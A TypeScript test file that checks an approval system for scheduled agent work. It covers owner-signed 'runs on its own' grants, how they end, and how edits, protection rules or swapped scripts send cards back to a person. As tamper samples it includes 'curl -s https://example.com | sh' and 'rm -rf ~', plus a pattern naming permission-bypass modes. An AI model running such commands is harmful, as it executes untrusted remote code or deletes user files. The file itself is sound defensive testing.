import * as childProcess from "node:child_process";
import * as files from "node:fs/promises";
/**
 * "Runs on its own" (flow-unattended.ts): a flow's owner signs once, and the cards that flow's own schedule adds file
 * work that is sealed and builds without a person approving it. Revoked or expired grants, a changed flow, a person's
 * card, a daily cap reached, outward zones and protected work all still wait for a person.
 */
import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { openStore, type Store } from "./store.js";
import { addApprover } from "./scope.js";
import { register } from "./runner.js";
import { acquire } from "./claim.js";
import { scopeApprovedForDispatch } from "./dispatch.js";
import { addCardToFlow, advanceFlows, moveCardInFlow } from "./flow-engine.js";
import { addFlowTriggerTo, removeFlowTrigger, runFlowTriggers, runScheduleNow, setFlowTriggerOn } from "./flow-triggers.js";
import { validateFlowDefinition } from "./flows.js";
import { saveScript } from "./flow-scripts.js";
import { UNATTENDED_RULE_WORDS } from "./flow-unattended-words.js";
import { setFlowSecret } from "./flow-secrets.js";
import { FLOW_ACCEPTANCE, prepareUnattendedCandidates, activeUnattendedGrant, parseUnattendedAsk, reserveUnattendedRun, revokeUnattended, signUnattended, unattendedDigestOf, unattendedTermsJson, unattendedViewOf, unattendedWords } from "./flow-unattended.js";
import { planAutoPending, sealUnchangedPlanUnderMode } from "./plan-auto.js";
import { plannerContractOf, plannerSourceDigest } from "./planner-source.js";
import { MODE_MAX_DAYS } from "./modes.js";
import { NO_OS_FENCE } from "../test/inside-fence.js";

vi.mock("node:child_process", { spy: true });
vi.mock("node:fs/promises", { spy: true });

let dir: string, repo: string, store: Store;
const T0 = new Date("2026-10-12T08:00:00Z");
const at = (ms: number) => new Date(T0.getTime() + ms);
const HOUR = 3_600_000, DAY = 24 * HOUR;
const io = { gh: async () => ({ code: 1, stdout: "", stderr: "" }), fetch, dir: null } as unknown as Parameters<typeof runFlowTriggers>[3];

beforeEach(() => {
  dir = realpathSync(mkdtempSync(join(tmpdir(), "flow-unattended-")));
  repo = join(dir, "site");
  mkdirSync(repo);
  store = openStore(join(dir, "orders.db"));
  const alex = addApprover(store, "alex", T0);
  if (!alex.ok || !addApprover(store, "sam", T0, { name: "alex", token: alex.token }).ok) throw Error("account");
  // Where no OS fence can be made (inside the plane's check, a runner without bubblewrap) an operator allows unconfined agents.
  if (NO_OS_FENCE) store.setUnfencedAgentsAllowed(true, "alex", T0);
  for (const phase of ["plan", "build", "review"]) store.setPhaseConfig("installation", phase, "claude", "sonnet", "test", T0);
});
afterEach(() => { vi.restoreAllMocks(); store.close(); rmSync(dir, { recursive: true, force: true }); });

/** A Weekly upkeep-shaped flow owned by alex: a schedule starts each card in a build, then a person decides. */
function scheduledFlow(options: { planning?: "skip" | "required"; start?: string } = {}): { flow: number; trigger: number } {
  const flow = store.createFlow({ repo, name: "Weekly upkeep", by: "alex", definitionJson: JSON.stringify(validateFlowDefinition({ version: 1, start: "update", stages: [
    { id: "update", title: "Update them", kind: "task", instructions: "Update the outdated dependencies. Run the tests.", planning: options.planning ?? "skip", next: "review" },
    { id: "review", title: "Review the updates", kind: "approval", next: "done" },
    { id: "done", title: "Done", kind: "done" },
  ] })) }, T0);
  const made = addFlowTriggerTo(store, store.getFlow(flow)!, { kind: "schedule", schedule: "daily 09:00", title: "Weekly upkeep", description: null, zone: options.start ?? null }, "alex", T0, null);
  if (!made.ok) throw Error(made.message);
  return { flow, trigger: made.id };
}

/** The schedule fires once at `now` (its slot is due), then the engine files the card's work. */
async function fire(trigger: number, now: Date): Promise<{ card: number; task: string | null }> {
  store.updateFlowTrigger(trigger, { nextAt: new Date(now.getTime() - 60_000).toISOString() }, now);
  const before = store.lastFlowTriggerCard(trigger);
  // One card at a time: the last one has left its first zone, as a picked-up card would.
  if (before !== null) store.updateFlowCard(before, { state: "done" }, now);
  await runFlowTriggers(store, repo, now, io);
  const card = store.lastFlowTriggerCard(trigger)!;
  expect(card).not.toBe(before);
  advanceFlows(store, repo, now);
  return { card, task: store.getFlowCard(card)!.task };
}

const sign = (flow: number, ask: Partial<{ days: number; budgetMicrousd: number | null; dailyRunCap: number | null; include: number[] }> = {}, signer = "alex", now = T0) =>
  signUnattended(store, { flow, signer, ask: { days: 2, budgetMicrousd: null, dailyRunCap: null, ...ask } }, now);

describe("signing", () => {
  test("only the flow's owner signs, for 1 to MODE_MAX_DAYS days, and it is in the ledger", async () => {
    const { flow } = scheduledFlow();
    expect(await sign(flow, {}, "sam")).toEqual({ ok: false, message: "Only alex, who owns this flow, can let it run on its own." });
    expect(parseUnattendedAsk({ days: "0" })).toMatchObject({ ok: false });
    expect(parseUnattendedAsk({ days: String(MODE_MAX_DAYS + 1) })).toMatchObject({ ok: false, message: `Choose 1 to ${MODE_MAX_DAYS} days: it always ends.` });
    expect(parseUnattendedAsk({ days: "7", budget: "$2.50", runs: "3" })).toEqual({ ok: true, ask: { days: 7, budgetMicrousd: 2_500_000, dailyRunCap: 3 } });
    expect(parseUnattendedAsk({ days: "1", runs: "0" })).toMatchObject({ ok: false });
    const signed = await sign(flow, { days: 3, budgetMicrousd: 5_000_000, dailyRunCap: 2 });
    if (!signed.ok) throw Error(signed.message);
    expect(signed.grant.absoluteExpiry).toBe(at(3 * DAY).toISOString());
    expect(signed.grant.terms).toMatchObject({ owner: "alex", permissions: "safe", acceptance: FLOW_ACCEPTANCE, perAttemptBudgetMicrousd: 5_000_000, dailyRunCap: 2 });
    expect(unattendedWords(signed.grant.terms)).toEqual(expect.arrayContaining(["Each attempt may spend up to $5.00.", "Ends Oct 15, 08:00 UTC. Revoking it earlier is one click."]));
    expect(store.actionLedger({ repos: [repo] })).toEqual(expect.arrayContaining([expect.objectContaining({ action: "flow runs on its own: signed", actor: "alex", outcome: "signed" })]));
  });

  test("a flow with no schedule, a protected project and protected paths are refused", async () => {
    const plain = store.createFlow({ repo, name: "Coding", by: "alex", definitionJson: JSON.stringify(validateFlowDefinition({ version: 1, start: "build", stages: [{ id: "build", title: "Build", kind: "task", instructions: "{{card.title}}" }] })) }, T0);
    expect(await sign(plain)).toEqual({ ok: false, message: "This flow has no schedule, so nothing would run on its own." });
    const { flow } = scheduledFlow();
    store.setApprovalRules(repo, { notRequester: false, protectProject: true, protectedPaths: [] }, "alex", T0);
    expect(await sign(flow)).toMatchObject({ ok: false, message: "This project is protected: a person approves its work." });
    store.setApprovalRules(repo, { notRequester: false, protectProject: false, protectedPaths: [".github/workflows"] }, "alex", T0);
    expect(await sign(flow)).toMatchObject({ ok: false, message: expect.stringContaining("protects some paths") });
    expect(unattendedViewOf(store, store.getFlow(flow)!, { name: "alex", approver: true }, T0)).toMatchObject({ active: null, canSign: false, scheduled: true });
  });
});

describe("a scheduled card", () => {
  test("on a flow signed to run on its own is sealed with the grant's terms and builds without a person", async () => {
    const { flow, trigger } = scheduledFlow();
    const signed = await sign(flow, { budgetMicrousd: 4_000_000 });
    if (!signed.ok) throw Error(signed.message);
    const { card, task } = await fire(trigger, at(HOUR));
    expect(task).not.toBeNull();
    const scope = store.getScope(task!)!;
    expect(store.scopeSealed(task!)).toBe(true);
    expect(scope).toMatchObject({ approvalBasis: "grant", modeDigest: signed.grant.digest, approvedBy: "alex", budgetMicrousd: 4_000_000, acceptance: FLOW_ACCEPTANCE.task });
    expect(JSON.stringify(scope.profile)).not.toMatch(/bypassPermissions|danger-full-access|yolo/);
    expect(store.getFlowCard(card)!.waiting).toBe("Filed as a task, approved: this flow runs on its own");
    // It dispatches: the scheduler's predicate, the claim belt, and a worker's claim.
    const ref = store.lookupRef(task!)!.id;
    expect(scopeApprovedForDispatch(store, ref, at(HOUR))).toBe(true);
    expect(store.modeApprovalLive(ref, at(HOUR))).toBe(true);
    register(store, { name: "builder", host: "test", capacity: 1, repos: [repo], now: at(HOUR), newToken: () => "builder-token" });
    expect(acquire(store, ref, "builder", { token: "builder-token", now: at(HOUR), ttlMs: HOUR })).toMatchObject({ ok: true });
    expect(store.actionLedger({ repos: [repo] })).toEqual(expect.arrayContaining([expect.objectContaining({ action: "flow ran on its own: approved", actor: "alex", taskId: task })]));
  });

  test("a build that plans is pre-authorized, and only its unchanged plan approves itself", async () => {
    const { flow, trigger } = scheduledFlow({ planning: "required" });
    const signed = await sign(flow);
    if (!signed.ok) throw Error(signed.message);
    const { task } = await fire(trigger, at(HOUR));
    expect(store.lookupRef(task!)!.plan).toBe("requested");
    expect(store.scopeSealed(task!)).toBe(false);
    expect(planAutoPending(store, task!, at(HOUR))).toBe(true);
    const source = plannerContractOf(store, task!);
    if (!source.ok) throw Error("source");
    // A plan that changed the filed contract (eligible: false) waits for a person; the authorization is spent either way.
    expect(sealUnchangedPlanUnderMode(store, task!, plannerSourceDigest(source.contract), 1, false, at(HOUR))).toBe(false);
    expect(store.scopeSealed(task!)).toBe(false);
    const second = await fire(trigger, at(2 * HOUR));
    const again = plannerContractOf(store, second.task!);
    if (!again.ok) throw Error("source");
    expect(sealUnchangedPlanUnderMode(store, second.task!, plannerSourceDigest(again.contract), 2, true, at(2 * HOUR))).toBe(true);
    expect(store.getScope(second.task!)).toMatchObject({ approvalBasis: "grant", approvedBy: "alex" });
  });

  test("a revoked grant falls back to Needs you, for the queued work it sealed and for the next card", async () => {
    const { flow, trigger } = scheduledFlow();
    await sign(flow);
    const first = await fire(trigger, at(HOUR));
    expect(store.scopeSealed(first.task!)).toBe(true);
    expect(revokeUnattended(store, flow, "sam", at(2 * HOUR))).toBe(true);
    expect(store.scopeSealed(first.task!)).toBe(false);
    expect(scopeApprovedForDispatch(store, store.lookupRef(first.task!)!.id, at(2 * HOUR))).toBe(false);
    const next = await fire(trigger, at(3 * HOUR));
    expect(store.scopeSealed(next.task!)).toBe(false);
    expect(store.getScope(next.task!)!.approvedAt).toBeNull();
    expect(store.actionLedger({ repos: [repo] })).toEqual(expect.arrayContaining([expect.objectContaining({ action: "flow stopped running on its own: revoked", actor: "sam" })]));
    expect(revokeUnattended(store, flow, "sam", at(3 * HOUR))).toBe(false);
  });

  test("an expired grant stops dispatching at once and the next card waits", async () => {
    const { flow, trigger } = scheduledFlow();
    await sign(flow, { days: 1 });
    const first = await fire(trigger, at(HOUR));
    const ref = store.lookupRef(first.task!)!.id;
    // By the clock alone, before anything closes the row, the belt refuses.
    expect(store.modeApprovalLive(ref, at(DAY + 1))).toBe(false);
    expect(scopeApprovedForDispatch(store, ref, at(DAY + 1))).toBe(false);
    const next = await fire(trigger, at(DAY + HOUR));
    expect(activeUnattendedGrant(store, flow, at(DAY + HOUR))).toBeNull();
    expect(store.scopeSealed(next.task!)).toBe(false);
    expect(store.scopeSealed(first.task!)).toBe(false);
  });

  test("editing the flow ends what the grant covers", async () => {
    const { flow, trigger } = scheduledFlow();
    await sign(flow);
    const current = store.getFlow(flow)!;
    expect(store.saveFlow(flow, { name: current.name, definitionJson: current.definitionJson, sawRevision: current.revision, by: "alex" }, at(HOUR))).toBe(true);
    const next = await fire(trigger, at(2 * HOUR));
    expect(store.scopeSealed(next.task!)).toBe(false);
    expect(unattendedViewOf(store, store.getFlow(flow)!, { name: "alex", approver: true }, at(2 * HOUR)).active).toBeNull();
  });

  test("the daily run cap admits that many a UTC day, then cards wait", async () => {
    const { flow, trigger } = scheduledFlow();
    await sign(flow, { dailyRunCap: 1 });
    expect(store.scopeSealed((await fire(trigger, at(HOUR))).task!)).toBe(true);
    expect(store.scopeSealed((await fire(trigger, at(2 * HOUR))).task!)).toBe(false);
    expect(store.scopeSealed((await fire(trigger, at(DAY))).task!)).toBe(true);
  });
});

describe("still a person's", () => {
  test("a card a person adds to a granted flow waits for approval", async () => {
    const { flow } = scheduledFlow();
    await sign(flow);
    const added = addCardToFlow(store, store.getFlow(flow)!, { title: "Bump the linter", description: null, stage: "update" }, "alex", at(HOUR));
    if (!added.ok) throw Error(added.message);
    advanceFlows(store, repo, at(HOUR));
    const task = store.getFlowCard(added.card)!.task!;
    expect(store.scopeSealed(task)).toBe(false);
  });

  test("a Person decides zone still waits for its person", async () => {
    const { flow, trigger } = scheduledFlow({ start: "review" });
    await sign(flow);
    const { card } = await fire(trigger, at(HOUR));
    expect(store.getFlowCard(card)).toMatchObject({ stage: "review", task: null, waiting: "Waiting for an approver to approve or send it back" });
    expect(store.actionLedger({ repos: [repo] }).some(one => one.action === "flow decision")).toBe(false);
  });

  test("protecting the project after signing refuses the next card", async () => {
    const { flow, trigger } = scheduledFlow();
    await sign(flow);
    store.setApprovalRules(repo, { notRequester: false, protectProject: true, protectedPaths: [] }, "sam", at(HOUR));
    const next = await fire(trigger, at(2 * HOUR));
    expect(store.scopeSealed(next.task!)).toBe(false);
    expect(store.getScope(next.task!)!.approvalBasis ?? null).not.toBe("grant");
  });
});

const sealed = (task: string | null) => task !== null && store.scopeSealed(task);
const dispatchable = (task: string, now: Date) => scopeApprovedForDispatch(store, store.lookupRef(task)!.id, now) && store.modeApprovalLive(store.lookupRef(task)!.id, now);
const ended = (reason: string) => store.actionLedger({ repos: [repo] }).filter(one => one.action === `flow stopped running on its own: ${reason}`);

describe("the grant covers only the schedules it signed", () => {
  test("another approver adding a schedule after signing ends the grant, and its card waits (P1)", async () => {
    const { flow, trigger } = scheduledFlow();
    const signed = await sign(flow);
    if (!signed.ok) throw Error(signed.message);
    expect(signed.grant.terms.triggers).toEqual([expect.objectContaining({ id: trigger, kind: "schedule", words: "“Weekly upkeep”, daily at 09:00" })]);
    const queued = await fire(trigger, at(HOUR));
    expect(sealed(queued.task)).toBe(true);
    const added = addFlowTriggerTo(store, store.getFlow(flow)!, { kind: "schedule", schedule: "every 1 hour", title: "Sam's chores", description: "Delete the old branches" }, "sam", at(2 * HOUR), null);
    if (!added.ok) throw Error(added.message);
    expect(activeUnattendedGrant(store, flow, at(2 * HOUR))).toBeNull();
    expect(ended("schedule changed")).toEqual([expect.objectContaining({ actor: "sam", outcome: "ended" })]);
    // The queued work it sealed falls back to a person too.
    expect(sealed(queued.task)).toBe(false);
    const theirs = await fire(added.id, at(3 * HOUR));
    expect(sealed(theirs.task)).toBe(false);
  });

  test("a covered schedule's settings changed underneath the grant are not covered", async () => {
    const { flow, trigger } = scheduledFlow();
    await sign(flow);
    store.handle.prepare("UPDATE flow_trigger SET config_json = ? WHERE id = ?").run(JSON.stringify({ kind: "schedule", schedule: "daily:09:00", title: "Force-push main", description: null, zone: null }), trigger);
    expect(sealed((await fire(trigger, at(HOUR))).task)).toBe(false);
  });

  test("pausing, resuming or removing a schedule ends the grant", async () => {
    const { flow, trigger } = scheduledFlow();
    const spare = addFlowTriggerTo(store, store.getFlow(flow)!, { kind: "schedule", schedule: "daily 10:00", title: "Lint pass", description: null }, "alex", T0, null);
    if (!spare.ok) throw Error(spare.message);
    const change = async (fn: () => void) => {
      expect((await sign(flow, {}, "alex", at(HOUR))).ok).toBe(true);
      fn();
      expect(activeUnattendedGrant(store, flow, at(2 * HOUR))).toBeNull();
    };
    await change(() => setFlowTriggerOn(store, store.getFlowTrigger(trigger)!, false, at(2 * HOUR), "sam"));
    await change(() => setFlowTriggerOn(store, store.getFlowTrigger(trigger)!, true, at(2 * HOUR), "sam"));
    await change(() => removeFlowTrigger(store, store.getFlowTrigger(trigger)!, at(2 * HOUR), null, "sam"));
    expect(ended("schedule changed")).toHaveLength(3);
  });

  test("a script's or a plane review's schedule is covered only when the owner picks it", async () => {
    store.saveFlowScript({ repo, name: "issues", about: "Open issues", body: "echo '[]'", timeoutMinutes: 1, digest: "test", by: "alex" }, T0);
    const flow = store.createFlow({ repo, name: "Triage", by: "alex", definitionJson: JSON.stringify(validateFlowDefinition({ version: 1, start: "fix", stages: [
      { id: "fix", title: "Fix it", kind: "task", instructions: "{{card.title}}", planning: "skip" }] })) }, T0);
    const script = addFlowTriggerTo(store, store.getFlow(flow)!, { kind: "schedule", schedule: "daily 09:00", script: "issues" }, "alex", T0, null);
    const plane = addFlowTriggerTo(store, store.getFlow(flow)!, { kind: "plane-review", at: "07:30", timeZone: "UTC" }, "alex", T0, null);
    if (!script.ok || !plane.ok) throw Error("trigger");
    expect(unattendedViewOf(store, store.getFlow(flow)!, { name: "alex", approver: true }, T0).schedules).toEqual([
      { id: script.id, words: "the issues script, daily at 09:00", optional: expect.stringContaining("outside text") },
      { id: plane.id, words: "Plane review, daily at 07:30", optional: expect.stringContaining("what the plane saw") },
    ]);
    expect(await sign(flow)).toEqual({ ok: false, message: expect.stringContaining("Choose a schedule to include") });
    expect(await sign(flow, { include: [999] })).toEqual({ ok: false, message: "Trigger 999 isn't one of this flow's active schedules." });
    const signed = await sign(flow, { include: [script.id] });
    if (!signed.ok) throw Error(signed.message);
    expect(signed.grant.terms.triggers.map(one => one.id)).toEqual([script.id]);
    expect(parseUnattendedAsk({ days: "1", include: "4, 7" })).toEqual({ ok: true, ask: { days: 1, budgetMicrousd: null, dailyRunCap: null, include: [4, 7] } });
  });

  test("a schedule that changed while the owner read the terms is refused", async () => {
    const { flow } = scheduledFlow();
    const shown = unattendedViewOf(store, store.getFlow(flow)!, { name: "alex", approver: true }, T0).schedulesDigest;
    addFlowTriggerTo(store, store.getFlow(flow)!, { kind: "schedule", schedule: "every 1 hour", title: "More", description: null }, "sam", T0, null);
    expect(await signUnattended(store, { flow, signer: "alex", ask: { days: 1, budgetMicrousd: null, dailyRunCap: null }, sawSchedules: shown }, T0)).toEqual({ ok: false, message: expect.stringContaining("schedules changed") });
  });
});

describe("only the clock's own firings, after signing, untouched by a person", () => {
  test("a person's Run now is not sealed (P2)", async () => {
    const { flow, trigger } = scheduledFlow();
    await sign(flow);
    const ran = runScheduleNow(store, store.getFlowTrigger(trigger)!, "sam", at(HOUR));
    if (!ran.ok) throw Error(ran.said);
    advanceFlows(store, repo, at(HOUR));
    const task = store.getFlowCard(ran.card)!.task;
    expect(task).not.toBeNull();
    expect(sealed(task)).toBe(false);
  });

  test("a card the schedule made before signing waits", async () => {
    const { flow, trigger } = scheduledFlow();
    store.updateFlowTrigger(trigger, { nextAt: T0.toISOString() }, T0);
    await runFlowTriggers(store, repo, at(HOUR), io);
    const card = store.lastFlowTriggerCard(trigger)!;
    await sign(flow, {}, "alex", at(2 * HOUR));
    advanceFlows(store, repo, at(2 * HOUR));
    expect(sealed(store.getFlowCard(card)!.task)).toBe(false);
  });

  test("a card a person moves back into its build zone waits", async () => {
    const { flow, trigger } = scheduledFlow();
    await sign(flow);
    const first = await fire(trigger, at(HOUR));
    expect(sealed(first.task)).toBe(true);
    for (const to of ["review", "update"]) {
      const moved = moveCardInFlow(store, store.getFlowCard(first.card)!, to, "sam", at(2 * HOUR));
      if (!moved.ok) throw Error(moved.message);
    }
    advanceFlows(store, repo, at(2 * HOUR));
    const again = store.getFlowCard(first.card)!.task;
    expect(again).not.toBeNull();
    expect(again).not.toBe(first.task);
    expect(sealed(again)).toBe(false);
  });
});

describe("authority re-proved after sealing", () => {
  test("protecting the project withdraws queued sealed work and ends the grant; the belt refuses a raced rule (P3)", async () => {
    const { flow, trigger } = scheduledFlow();
    await sign(flow);
    const queued = await fire(trigger, at(HOUR));
    expect(dispatchable(queued.task!, at(HOUR))).toBe(true);
    // A rule written beside the ceremony (a race, or an older writer): dispatch refuses on its own.
    store.handle.prepare("INSERT INTO approval_policy (repo, not_requester, protect_project, protected_paths, updated_by, updated_at) VALUES (?, 0, 0, ?, 'sam', ?)").run(repo, JSON.stringify(["infra/"]), at(HOUR).toISOString());
    expect(dispatchable(queued.task!, at(HOUR))).toBe(false);
    store.handle.prepare("DELETE FROM approval_policy WHERE repo = ?").run(repo);
    expect(dispatchable(queued.task!, at(HOUR))).toBe(true);
    store.setApprovalRules(repo, { notRequester: false, protectProject: true, protectedPaths: [] }, "sam", at(2 * HOUR));
    expect(activeUnattendedGrant(store, flow, at(2 * HOUR))).toBeNull();
    expect(ended("project protected")).toEqual([expect.objectContaining({ actor: "sam" })]);
    expect(sealed(queued.task)).toBe(false);
    expect(scopeApprovedForDispatch(store, store.lookupRef(queued.task!)!.id, at(2 * HOUR))).toBe(false);
  });

  test("the belt refuses once the owner can't reach the project, and an access change ends the grant (P4)", async () => {
    const { flow, trigger } = scheduledFlow();
    await sign(flow);
    const queued = await fire(trigger, at(HOUR));
    const elsewhere = join(dir, "elsewhere");
    mkdirSync(elsewhere);
    store.handle.prepare("UPDATE approver SET projects_json = ? WHERE name = 'alex'").run(JSON.stringify([elsewhere]));
    expect(dispatchable(queued.task!, at(HOUR))).toBe(false);
    store.handle.prepare("UPDATE approver SET projects_json = NULL WHERE name = 'alex'").run();
    expect(dispatchable(queued.task!, at(HOUR))).toBe(true);
    expect(store.setAccountProjects("alex", [elsewhere], "sam", at(2 * HOUR))).toEqual({ ok: true });
    expect(activeUnattendedGrant(store, flow, at(2 * HOUR))).toBeNull();
    expect(ended("access changed")).toEqual([expect.objectContaining({ actor: "sam" })]);
    expect(sealed(queued.task)).toBe(false);
  });

  test("renewing withdraws what the old grant sealed and pre-authorized", async () => {
    const { flow, trigger } = scheduledFlow({ planning: "required" });
    const old = await sign(flow);
    if (!old.ok) throw Error(old.message);
    const { task } = await fire(trigger, at(HOUR));
    expect(planAutoPending(store, task!, at(HOUR))).toBe(true);
    const renewed = await sign(flow, { days: 3 }, "alex", at(2 * HOUR));
    if (!renewed.ok) throw Error(renewed.message);
    expect(renewed.grant.digest).not.toBe(old.grant.digest);
    expect(planAutoPending(store, task!, at(2 * HOUR))).toBe(false);
    expect(store.handle.prepare("SELECT COUNT(*) AS n FROM plan_authorization WHERE mode_digest = ?").get(old.grant.digest)!["n"]).toBe(0);
    expect(store.actionLedger({ repos: [repo] })).toEqual(expect.arrayContaining([expect.objectContaining({ action: "flow runs on its own: renewed", actor: "alex" })]));
  });

  test("the daily cap is one statement: two connections racing for the last run, one wins", async () => {
    const { flow } = scheduledFlow();
    const signed = await sign(flow, { dailyRunCap: 1 });
    if (!signed.ok) throw Error(signed.message);
    const other = openStore(join(dir, "orders.db"));
    try {
      const results = [reserveUnattendedRun(store, signed.grant, "t-a", at(HOUR)), reserveUnattendedRun(other, signed.grant, "t-b", at(HOUR))];
      expect(results).toEqual([true, false]);
    } finally { other.close(); }
  });

  test("two of the flow's schedules due at once under a cap of one: one is sealed, one waits", async () => {
    const { flow, trigger } = scheduledFlow();
    const second = addFlowTriggerTo(store, store.getFlow(flow)!, { kind: "schedule", schedule: "daily 10:00", title: "Lint pass", description: null }, "alex", T0, null);
    if (!second.ok) throw Error(second.message);
    await sign(flow, { dailyRunCap: 1 });
    for (const one of [trigger, second.id]) store.updateFlowTrigger(one, { nextAt: T0.toISOString() }, T0);
    await runFlowTriggers(store, repo, at(HOUR), io);
    advanceFlows(store, repo, at(HOUR));
    const tasks = [trigger, second.id].map(one => store.getFlowCard(store.lastFlowTriggerCard(one)!)!.task);
    expect(tasks.filter(sealed)).toHaveLength(1);
  });
});

describe("a script schedule is pinned by its code, not its name", () => {
  let printed = 0;
  /** What happens to the project while the script runs (nothing, unless a test swaps a file). */
  let whileRunning = () => {};
  // The script's runner: each run prints one new item, which the schedule makes a card.
  const scriptIo = { ...io, shell: async () => { whileRunning(); return { code: 0, stdout: JSON.stringify([{ key: ++printed, title: `Bump dependency ${printed}` }]), stderr: "" }; }, scratch: "", dir: "" } as unknown as Parameters<typeof runFlowTriggers>[3];
  beforeEach(() => { whileRunning = () => {}; Object.assign(scriptIo, { scratch: join(dir, "scratch"), dir }); });

  /** A flow whose schedule runs the issues script (written here, or a project file), included when signing. */
  function scriptFlow(file: string | null = null, planning: "skip" | "required" = "skip", language: "shell" | "node" = "shell"): { flow: number; trigger: number } {
    const saved = saveScript(store, repo, { name: "issues", about: "Open issues", language, ...(file === null ? { body: "echo '[]'" } : { body: "", file }), timeoutMinutes: 1 }, "alex", T0);
    if (!saved.ok) throw Error(saved.message);
    const flow = store.createFlow({ repo, name: "Triage", by: "alex", definitionJson: JSON.stringify(validateFlowDefinition({ version: 1, start: "fix", stages: [
      { id: "fix", title: "Fix it", kind: "task", instructions: "{{card.title}}", planning }] })) }, T0);
    const made = addFlowTriggerTo(store, store.getFlow(flow)!, { kind: "schedule", schedule: "daily 09:00", script: "issues" }, "alex", T0, null);
    if (!made.ok) throw Error(made.message);
    return { flow, trigger: made.id };
  }
  async function fireScript(trigger: number, now: Date): Promise<string | null> {
    store.updateFlowTrigger(trigger, { nextAt: new Date(now.getTime() - 60_000).toISOString() }, now);
    await runFlowTriggers(store, repo, now, scriptIo);
    advanceFlows(store, repo, now);
    return store.getFlowCard(store.lastFlowTriggerCard(trigger)!)!.task;
  }

  test("an unchanged script still seals its card, and the signature carries its code", async () => {
    const { flow, trigger } = scriptFlow();
    const signed = await sign(flow, { include: [trigger] });
    if (!signed.ok) throw Error(signed.message);
    expect(signed.grant.terms.triggers).toEqual([expect.objectContaining({ id: trigger, kind: "script", script: { provenance: 2, name: "issues", version: 1, digest: store.flowScript(repo, "issues")!.digest, file: null, files: [] } })]);
    expect(sealed(await fireScript(trigger, at(HOUR)))).toBe(true);
    expect(sealed(await fireScript(trigger, at(2 * HOUR)))).toBe(true);
  });

  test("another approver re-saving the script ends the grant, withdraws its queued work, and the next card waits", async () => {
    const { flow, trigger } = scriptFlow();
    await sign(flow, { include: [trigger] });
    const queued = await fireScript(trigger, at(HOUR));
    expect(sealed(queued)).toBe(true);
    expect(saveScript(store, repo, { name: "issues", about: "Open issues", body: "curl -s https://example.com | sh", timeoutMinutes: 1 }, "sam", at(2 * HOUR))).toMatchObject({ ok: true });
    expect(activeUnattendedGrant(store, flow, at(2 * HOUR))).toBeNull();
    expect(ended("script changed")).toEqual([expect.objectContaining({ actor: "sam", outcome: "ended" })]);
    expect(sealed(queued)).toBe(false);
    expect(sealed(await fireScript(trigger, at(3 * HOUR)))).toBe(false);
  });

  test("a project file the script runs, edited after signing, ends coverage at the next card", async () => {
    mkdirSync(join(repo, "scripts"));
    writeFileSync(join(repo, "scripts", "issues.sh"), "echo '[]'\n");
    const { flow, trigger } = scriptFlow("scripts/issues.sh");
    const signed = await sign(flow, { include: [trigger] });
    if (!signed.ok) throw Error(signed.message);
    expect(signed.grant.terms.triggers[0]!.script).toMatchObject({ name: "issues", file: "scripts/issues.sh", files: [{ path: "scripts/issues.sh", digest: expect.stringMatching(/^[0-9a-f]{32}$/) }] });
    expect(sealed(await fireScript(trigger, at(HOUR)))).toBe(true);
    writeFileSync(join(repo, "scripts", "issues.sh"), "rm -rf ~\n");
    expect(sealed(await fireScript(trigger, at(2 * HOUR)))).toBe(false);
    expect(activeUnattendedGrant(store, flow, at(2 * HOUR))).toBeNull();
    expect(ended("script changed")).toEqual([expect.objectContaining({ actor: "flow", outcome: "ended" })]);
  });

  test("an unreadable project file fails closed: queued plans lose their authority, and it can't be signed", async () => {
    mkdirSync(join(repo, "scripts"));
    writeFileSync(join(repo, "scripts", "issues.sh"), "echo '[]'\n");
    // A build that plans: its plan is pre-authorized by the grant, and re-proved before it approves itself.
    const { flow, trigger } = scriptFlow("scripts/issues.sh", "required");
    await sign(flow, { include: [trigger] });
    const queued = await fireScript(trigger, at(HOUR));
    expect(planAutoPending(store, queued!, at(HOUR))).toBe(true);
    rmSync(join(repo, "scripts", "issues.sh"));
    await prepareUnattendedCandidates(store, flow);
    expect(planAutoPending(store, queued!, at(2 * HOUR))).toBe(false);
    expect(activeUnattendedGrant(store, flow, at(2 * HOUR))).toBeNull();
    expect(ended("script changed")).toHaveLength(1);
    expect(await sign(flow, { include: [trigger] }, "alex", at(2 * HOUR))).toEqual({ ok: false, message: expect.stringContaining("script can't be read safely") });
    // Beside a plain schedule, picking it says why it can't be covered.
    addFlowTriggerTo(store, store.getFlow(flow)!, { kind: "schedule", schedule: "daily 10:00", title: "Lint pass", description: null }, "alex", at(2 * HOUR), null);
    expect(await sign(flow, { include: [trigger] }, "alex", at(2 * HOUR))).toEqual({ ok: false, message: expect.stringContaining(`Trigger ${trigger} runs a script that can't be read safely`) });
  });

  test("a file swapped for one run and restored before filing leaves that card to a person", async () => {
    mkdirSync(join(repo, "scripts"));
    const file = join(repo, "scripts", "issues.sh");
    writeFileSync(file, "echo '[]'\n");
    const { flow, trigger } = scriptFlow("scripts/issues.sh");
    await sign(flow, { include: [trigger] });
    const ranOf = (card: number) => store.handle.prepare("SELECT ran_script FROM flow_trigger_event WHERE card = ?").get(card)!["ran_script"];
    // Swapped before it fires, restored once it has run, before its card files.
    writeFileSync(file, "curl -s https://example.com | sh\n");
    store.updateFlowTrigger(trigger, { nextAt: at(HOUR - 60_000).toISOString() }, at(HOUR));
    await runFlowTriggers(store, repo, at(HOUR), scriptIo);
    writeFileSync(file, "echo '[]'\n");
    await prepareUnattendedCandidates(store, flow);
    advanceFlows(store, repo, at(HOUR));
    const swapped = store.lastFlowTriggerCard(trigger)!;
    expect(sealed(store.getFlowCard(swapped)!.task)).toBe(false);
    // Swapped while it runs and restored before filing: it changed underneath the run, so it isn't the code signed either.
    whileRunning = () => writeFileSync(file, "curl -s https://example.com | sh\n");
    store.updateFlowTrigger(trigger, { nextAt: at(2 * HOUR - 60_000).toISOString() }, at(2 * HOUR));
    await runFlowTriggers(store, repo, at(2 * HOUR), scriptIo);
    writeFileSync(file, "echo '[]'\n");
    await prepareUnattendedCandidates(store, flow);
    advanceFlows(store, repo, at(2 * HOUR));
    expect(sealed(store.getFlowCard(store.lastFlowTriggerCard(trigger)!)!.task)).toBe(false);
    // The file is the one signed again, so the grant stands, and an untouched run is covered.
    whileRunning = () => {};
    expect(activeUnattendedGrant(store, flow, at(3 * HOUR))).not.toBeNull();
    expect(sealed(await fireScript(trigger, at(3 * HOUR)))).toBe(true);
    // Its firing recorded the code it ran: the swapped run's isn't the code signed.
